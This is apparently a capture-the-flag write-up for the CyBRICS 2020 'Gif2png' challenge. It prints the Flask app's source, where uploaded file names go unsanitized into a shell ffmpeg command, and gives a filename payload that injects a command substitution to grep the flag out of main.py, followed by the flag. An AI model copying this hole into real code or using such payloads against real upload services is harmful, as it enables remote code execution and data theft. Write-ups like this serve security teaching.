@@ -1,0 +1,144 @@
+<h1>Gif2png</h1>
+
+<p>Author: <a href="https://github.com/roerohan">roerohan</a></p>
+
+<h1>Requirements</h1>
+
+<ul>
+<li>Flask</li>
+</ul>
+
+<h1>Source</h1>
+
+<p><code>
+The webdev department created another cool startup. Here you can convert any animated GIF to PNG images. It's only left to figure out how to monetize it: gif2png-cybrics2020.ctf.su/
+</code></p>
+
+<p>```py
+import logging
+import re
+import subprocess
+import uuid
+from pathlib import Path</p>
+
+<p>from flask import Flask, render<em>template, request, redirect, url</em>for, flash, send<em>from</em>directory
+from flask<em>bootstrap import Bootstrap
+import os
+from werkzeug.utils import secure</em>filename
+import filetype</p>
+
+<p>ALLOWED_EXTENSIONS = {'gif'}</p>
+
+<p>app = Flask(<strong>name</strong>)
+app.config['UPLOAD<em>FOLDER'] = './uploads'
+app.config['SECRET</em>KEY'] = '<strong><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em></strong>'
+app.config['MAX_CONTENT_LENGTH'] = 500 * 1024  # 500Kb
+ffLaG = "cybrics{<strong></em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em><em>*</em></strong>}"
+Bootstrap(app)
+logging.getLogger().setLevel(logging.DEBUG)</p>
+
+<p>def allowed<em>file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED</em>EXTENSIONS</p>
+
+<p>@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    logging.debug(request.headers)
+    if request.method == 'POST':
+        if 'file' not in request.files:
+            logging.debug('No file part')
+            flash('No file part', 'danger')
+            return redirect(request.url)</p>
+
+<pre><code>    file = request.files['file']
+    if file.filename == '':
+        logging.debug('No selected file')
+        flash('No selected file', 'danger')
+        return redirect(request.url)
+
+    if not allowed_file(file.filename):
+        logging.debug(f'Invalid file extension of file: {file.filename}')
+        flash('Invalid file extension', 'danger')
+        return redirect(request.url)
+
+    if file.content_type != "image/gif":
+        logging.debug(f'Invalid Content type: {file.content_type}')
+        flash('Content type is not "image/gif"', 'danger')
+        return redirect(request.url)
+
+    if not bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", file.filename)) or ".." in file.filename:
+        logging.debug(f'Invalid symbols in filename: {file.content_type}')
+        flash('Invalid filename', 'danger')
+        return redirect(request.url)
+
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
+
+        mime_type = filetype.guess_mime(f'uploads/{file.filename}')
+        if mime_type != "image/gif":
+            logging.debug(f'Invalid Mime type: {mime_type}')
+            flash('Mime type is not "image/gif"', 'danger')
+            return redirect(request.url)
+
+        uid = str(uuid.uuid4())
+        os.mkdir(f"uploads/{uid}")
+
+        logging.debug(f"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"")
+
+        command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
+        command.wait(timeout=15)
+        logging.debug(command.stdout)
+
+        flash('Successfully saved', 'success')
+        return redirect(url_for('result', uid=uid))
+
+return render_template("form.html")
+</code></pre>
+
+<p>@app.route('/result/<uid>/')
+def result(uid):
+    images = []
+    for image in os.listdir(f"uploads/{uid}"):
+        mime<em>type = filetype.guess(str(Path("uploads") / uid / image))
+        if image.endswith(".png") and mime</em>type is not None and mime_type.EXTENSION == "png":
+            images.append(image)</p>
+
+<pre><code>return render_template("result.html", uid=uid, images=images)
+</code></pre>
+
+<p>@app.route('/uploads/<uid>/<image>')
+def image(uid, image):
+    logging.debug(request.headers)
+    dir = str(Path(app.config['UPLOAD<em>FOLDER']) / uid)
+    return send</em>from_directory(dir, image)</p>
+
+<p>@app.errorhandler(413)
+def request<em>entity</em>too_large(error):
+    return "File is too large", 413</p>
+
+<p>if <strong>name</strong> == "<strong>main</strong>":
+    app.run(host='localhost', port=5000, debug=False, threaded=True)
+```</p>
+
+<h1>Exploitation</h1>
+
+<p>The following line is critical:</p>
+
+<p><code>python
+command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
+</code></p>
+
+<p>Here, you can do RCE with the file name. The idea is to <code>grep</code> the flag from the <code>main.py</code> file, and write it on the image which the gif is going to get converted to. This can be done with the <code>-vf drawtext=..."</code> option. Here's the payload.</p>
+
+<p><code>
+csictf.gif' -vf drawtext=\"text=$(grep ffLaG main.py)\"'.gif
+</code></p>
+
+<p>When you upload this gif, you get the flag written on the resulting <code>png</code>.
+<br /></p>
+
+<p>The flag is:</p>
+
+<p><code>
+cybrics{imagesaresocoolicandrawonthem}
+</code></p>
